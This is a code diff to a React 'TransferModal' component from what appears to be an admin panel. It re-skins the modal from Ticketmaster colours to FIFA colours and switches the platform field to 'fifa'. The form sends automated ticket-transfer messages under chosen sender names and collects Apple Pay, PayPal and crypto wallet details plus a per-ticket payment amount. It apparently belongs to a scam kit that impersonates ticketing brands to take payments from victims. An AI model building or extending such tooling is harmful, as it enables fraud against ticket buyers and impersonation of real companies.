@@ -86,7 +86,7 @@ export default function TransferModal({ isOpen, onClose, ticket }: TransferModal
             payload.append('admin', admin.username);
             payload.append('senderName', admin.accountName || admin.username);
             payload.append('senderEmail', admin.accountEmail || 'user@virtualmail.com');
-            payload.append('userPlatform', 'ticketmaster');
+            payload.append('userPlatform', 'fifa');
             payload.append('sendType', 'auto');
             payload.append('note', formData.note);
             payload.append('token', crypto.randomUUID());
@@ -188,11 +188,11 @@ export default function TransferModal({ isOpen, onClose, ticket }: TransferModal
                                             onClick={() => toggleSeat(seat)}
                                             className="shrink-0 w-[110px] bg-white rounded-xl shadow-[0_8px_25px_rgba(0,0,0,0.1)] border border-gray-100 overflow-hidden group active:scale-95 transition-all"
                                         >
-                                            <div className={`py-2 text-[10px] font-black uppercase tracking-widest text-center transition-colors ${selectedSeats.includes(seat) ? 'bg-[#026CDF] text-white' : 'bg-[#E5E7EB] text-gray-500'}`}>
+                                            <div className={`py-2 text-[10px] font-black uppercase tracking-widest text-center transition-colors ${selectedSeats.includes(seat) ? 'bg-[#002B7F] text-white' : 'bg-[#E5E7EB] text-gray-500'}`}>
                                                 Seat {seat}
                                             </div>
                                             <div className="py-6 flex justify-center">
-                                                <div className={`w-8 h-8 rounded-full border-2 transition-all flex items-center justify-center ${selectedSeats.includes(seat) ? 'border-[#026CDF] bg-[#026CDF]' : 'border-gray-200 bg-white'}`}>
+                                                <div className={`w-8 h-8 rounded-full border-2 transition-all flex items-center justify-center ${selectedSeats.includes(seat) ? 'border-[#002B7F] bg-[#002B7F]' : 'border-gray-200 bg-white'}`}>
                                                     {selectedSeats.includes(seat) && <div className="w-2 h-2 bg-white rounded-full"></div>}
                                                 </div>
                                             </div>
@@ -219,7 +219,7 @@ export default function TransferModal({ isOpen, onClose, ticket }: TransferModal
                                     <input 
                                         type="text"
                                         placeholder="First Name"
-                                        className="w-full p-4 bg-white border border-gray-200 rounded-md text-sm font-bold outline-none focus:border-[#026CDF]"
+                                        className="w-full p-4 bg-white border border-gray-200 rounded-md text-sm font-bold outline-none focus:border-[#002B7F]"
                                         value={formData.firstName}
                                         onChange={(e) => setFormData({...formData, firstName: e.target.value})}
                                     />
@@ -229,7 +229,7 @@ export default function TransferModal({ isOpen, onClose, ticket }: TransferModal
                                     <input 
                                         type="text"
                                         placeholder="Last Name"
-                                        className="w-full p-4 bg-white border border-gray-200 rounded-md text-sm font-bold outline-none focus:border-[#026CDF]"
+                                        className="w-full p-4 bg-white border border-gray-200 rounded-md text-sm font-bold outline-none focus:border-[#002B7F]"
                                         value={formData.lastName}
                                         onChange={(e) => setFormData({...formData, lastName: e.target.value})}
                                     />
@@ -239,7 +239,7 @@ export default function TransferModal({ isOpen, onClose, ticket }: TransferModal
                                     <input 
                                         type="text"
                                         placeholder="Email or Mobile Number"
-                                        className="w-full p-4 bg-white border border-gray-200 rounded-md text-sm font-bold outline-none focus:border-[#026CDF]"
+                                        className="w-full p-4 bg-white border border-gray-200 rounded-md text-sm font-bold outline-none focus:border-[#002B7F]"
                                         value={formData.recipient}
                                         onChange={(e) => setFormData({...formData, recipient: e.target.value})}
                                     />
@@ -248,7 +248,7 @@ export default function TransferModal({ isOpen, onClose, ticket }: TransferModal
                                     <label className="text-[11px] font-black text-[#1F1F1F] uppercase tracking-widest">Note</label>
                                     <textarea 
                                         placeholder="Note"
-                                        className="w-full p-4 bg-white border border-gray-200 rounded-md text-sm font-bold outline-none focus:border-[#026CDF] h-24 resize-none"
+                                        className="w-full p-4 bg-white border border-gray-200 rounded-md text-sm font-bold outline-none focus:border-[#002B7F] h-24 resize-none"
                                         value={formData.note}
                                         onChange={(e) => setFormData({...formData, note: e.target.value})}
                                     />
@@ -262,33 +262,33 @@ export default function TransferModal({ isOpen, onClose, ticket }: TransferModal
                                     <div className="space-y-3">
                                         <div className="space-y-1">
                                             <label className="text-[11px] font-black text-gray-400 uppercase tracking-widest">Apple Pay Number</label>
-                                            <input type="text" value={applePayNumber} onChange={(e) => setApplePayNumber(e.target.value)} className="w-full p-4 bg-white border border-gray-200 rounded-md text-sm font-bold outline-none focus:border-[#026CDF]" placeholder="e.g. +1234567890" />
+                                            <input type="text" value={applePayNumber} onChange={(e) => setApplePayNumber(e.target.value)} className="w-full p-4 bg-white border border-gray-200 rounded-md text-sm font-bold outline-none focus:border-[#002B7F]" placeholder="e.g. +1234567890" />
                                         </div>
                                         <div className="space-y-1">
                                             <label className="text-[11px] font-black text-gray-400 uppercase tracking-widest">PayPal (paypal.me link)</label>
-                                            <input type="text" value={paypalLink} onChange={(e) => setPaypalLink(e.target.value)} className="w-full p-4 bg-white border border-gray-200 rounded-md text-sm font-bold outline-none focus:border-[#026CDF]" placeholder="e.g. paypal.me/username" />
+                                            <input type="text" value={paypalLink} onChange={(e) => setPaypalLink(e.target.value)} className="w-full p-4 bg-white border border-gray-200 rounded-md text-sm font-bold outline-none focus:border-[#002B7F]" placeholder="e.g. paypal.me/username" />
                                         </div>
                                         <div className="grid grid-cols-2 gap-3">
                                             <div className="space-y-1">
                                                 <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest">BTC Wallet</label>
-                                                <input type="text" value={btcWallet} onChange={(e) => setBtcWallet(e.target.value)} className="w-full p-3 bg-white border border-gray-200 rounded-md text-xs font-bold outline-none focus:border-[#026CDF]" placeholder="BTC" />
+                                                <input type="text" value={btcWallet} onChange={(e) => setBtcWallet(e.target.value)} className="w-full p-3 bg-white border border-gray-200 rounded-md text-xs font-bold outline-none focus:border-[#002B7F]" placeholder="BTC" />
                                             </div>
                                             <div className="space-y-1">
                                                 <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest">ETH Wallet</label>
-                                                <input type="text" value={ethWallet} onChange={(e) => setEthWallet(e.target.value)} className="w-full p-3 bg-white border border-gray-200 rounded-md text-xs font-bold outline-none focus:border-[#026CDF]" placeholder="ETH" />
+                                                <input type="text" value={ethWallet} onChange={(e) => setEthWallet(e.target.value)} className="w-full p-3 bg-white border border-gray-200 rounded-md text-xs font-bold outline-none focus:border-[#002B7F]" placeholder="ETH" />
                                             </div>
                                             <div className="space-y-1">
                                                 <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest">TRC Wallet</label>
-                                                <input type="text" value={trcWallet} onChange={(e) => setTrcWallet(e.target.value)} className="w-full p-3 bg-white border border-gray-200 rounded-md text-xs font-bold outline-none focus:border-[#026CDF]" placeholder="TRC" />
+                                                <input type="text" value={trcWallet} onChange={(e) => setTrcWallet(e.target.value)} className="w-full p-3 bg-white border border-gray-200 rounded-md text-xs font-bold outline-none focus:border-[#002B7F]" placeholder="TRC" />
                                             </div>
                                             <div className="space-y-1">
                                                 <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest">USDT Wallet</label>
-                                                <input type="text" value={usdtWallet} onChange={(e) => setUsdtWallet(e.target.value)} className="w-full p-3 bg-white border border-gray-200 rounded-md text-xs font-bold outline-none focus:border-[#026CDF]" placeholder="USDT" />
+                                                <input type="text" value={usdtWallet} onChange={(e) => setUsdtWallet(e.target.value)} className="w-full p-3 bg-white border border-gray-200 rounded-md text-xs font-bold outline-none focus:border-[#002B7F]" placeholder="USDT" />
                                             </div>
                                         </div>
                                         <div className="space-y-1">
                                             <label className="text-[11px] font-black text-gray-400 uppercase tracking-widest">Payment Amount (per ticket)</label>
-                                            <input type="text" value={paymentAmount} onChange={(e) => setPaymentAmount(e.target.value)} className="w-full p-4 bg-white border border-gray-200 rounded-md text-sm font-bold outline-none focus:border-[#026CDF]" placeholder="e.g. 150.00" />
+                                            <input type="text" value={paymentAmount} onChange={(e) => setPaymentAmount(e.target.value)} className="w-full p-4 bg-white border border-gray-200 rounded-md text-sm font-bold outline-none focus:border-[#002B7F]" placeholder="e.g. 150.00" />
                                         </div>
                                     </div>
                                 </div>
@@ -327,7 +327,7 @@ export default function TransferModal({ isOpen, onClose, ticket }: TransferModal
                                 <button 
                                     onClick={() => selectedSeats.length > 0 && setView('form')}
                                     disabled={selectedSeats.length === 0}
-                                    className={`text-[12px] font-black uppercase tracking-widest flex items-center transition-colors ${selectedSeats.length > 0 ? 'text-[#026CDF]' : 'text-gray-300'}`}
+                                    className={`text-[12px] font-black uppercase tracking-widest flex items-center transition-colors ${selectedSeats.length > 0 ? 'text-[#002B7F]' : 'text-gray-300'}`}
                                 >
                                     Transfer To <FontAwesomeIcon icon={faChevronRight} className="ml-2" />
                                 </button>
@@ -336,14 +336,14 @@ export default function TransferModal({ isOpen, onClose, ticket }: TransferModal
                             <div className="flex items-center justify-between">
                                 <button 
                                     onClick={() => setView('select')}
-                                    className="text-[11px] font-black text-[#026CDF] uppercase tracking-widest flex items-center"
+                                    className="text-[11px] font-black text-[#002B7F] uppercase tracking-widest flex items-center"
                                 >
                                     <FontAwesomeIcon icon={faChevronLeft} className="mr-2" /> Back
                                 </button>
                                 <button 
                                     onClick={handleTransfer}
                                     disabled={loading || !formData.recipient || !formData.firstName}
-                                    className="bg-[#026CDF] text-white px-8 py-3 rounded-md font-black text-[12px] uppercase tracking-widest shadow-lg shadow-[#026CDF]/20 disabled:opacity-50 transition-all flex items-center"
+                                    className="bg-[#002B7F] text-white px-8 py-3 rounded-md font-black text-[12px] uppercase tracking-widest shadow-lg shadow-[#002B7F]/20 disabled:opacity-50 transition-all flex items-center"
                                 >
                                     {loading ? (
                                         <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
